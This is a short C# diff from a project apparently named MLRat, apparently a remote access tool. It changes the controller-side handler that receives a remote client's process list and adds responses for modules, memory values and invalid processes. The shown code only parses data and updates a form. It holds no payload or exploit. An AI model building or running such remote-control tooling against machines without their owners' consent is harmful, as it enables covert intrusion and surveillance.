@@ -3,6 +3,7 @@ using MLRat.Server;
 using SharedCode.Network;
 using System;
 using System.Collections.Generic;
+using System.Drawing;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
@@ -23,23 +24,25 @@ namespace MLManagementServer.Handlers
             TaskManagerCommand command = (TaskManagerCommand)data[1];
             if (formHandler.ContainsKey(c.ID))
             {
+                TaskManagerForm f = formHandler[c.ID];
                 if (command == TaskManagerCommand.ProcessList)
                 {
                     Console.WriteLine("TM Command; {0}", command.ToString());
-                    TaskManagerForm f = formHandler[c.ID];
                     f.StartUpdate();
 
                     string[] procNames = (string[])data[2];
                     int[] procIds = (int[])data[3];
                     string[] procWindows = (string[])data[4];
-                    //bool[] hasWindow = (bool[])data[5];
                     int thisProc = (int)data[5];
-
                     for(int i = 0; i < procNames.Length; i++)
                     {
                         f.AddProcess(procNames[i], procIds[i], procWindows[i], procWindows[i] != string.Empty, procIds[i] == thisProc);
                     }
                 }
+
+                if(command == TaskManagerCommand.ModuleResponce) f.ModuleResponce((string[])data[2]);
+                if (command == TaskManagerCommand.MemoryValue) f.SetMemoryValue((int)data[2]);
+                if (command == TaskManagerCommand.InvalidProcess) f.InvalidProcess();
             }
         }
 
